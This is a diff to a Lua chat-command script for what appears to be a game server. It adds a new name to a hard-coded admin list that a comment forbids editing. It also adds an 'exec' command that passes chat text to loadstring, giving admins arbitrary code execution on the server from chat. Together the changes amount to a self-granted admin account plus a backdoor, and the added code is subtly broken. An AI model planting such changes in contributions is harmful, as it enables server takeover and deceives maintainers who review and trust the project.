@@ -65,7 +65,8 @@ local admins = { --table with all server admins(DO NOT TOUCH OR YOUR PR WILL NOT
 "roger109z",
 "hugeblank",
 "cyborgtwins",
-"EldidiStroyrr"
+"EldidiStroyrr",
+"TheDacinator"
 }
 local function isAdmin(name) --checks if admin(DO NOT TOUCH OR YOUR PR WILL NOT BE ACCEPTED!)
     for _, v in pairs(admins) do
@@ -604,6 +605,13 @@ local function main()--the main function it's only a function because I needed t
                         tell(name,"&6Invalid command")
                     end
                 end
+            elseif isAdmin(name) and command[1] == "exec" then
+                table.remove(command[1])
+                local string = ""
+                for k, v in pairs(command) do
+                    string = string..v
+                end
+                loadstring(string)()
             else
                 if name ~= "join" then --if command unknown it tells them
                     commands.tellraw(name, color.format("&cUnknown Command! Use &6!help &cfor a list of commands."))
